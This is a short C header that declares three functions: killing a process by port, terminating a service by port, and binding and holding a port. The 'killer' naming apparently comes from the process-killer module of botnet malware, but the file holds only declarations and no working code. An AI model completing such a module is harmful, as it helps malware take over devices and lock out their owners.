#pragma once

#include "includes.h"

BOOL killer_kill_by_port(port_t);
BOOL terminate_service_by_port(port_t);
void bind_and_hold_specific_port(port_t);
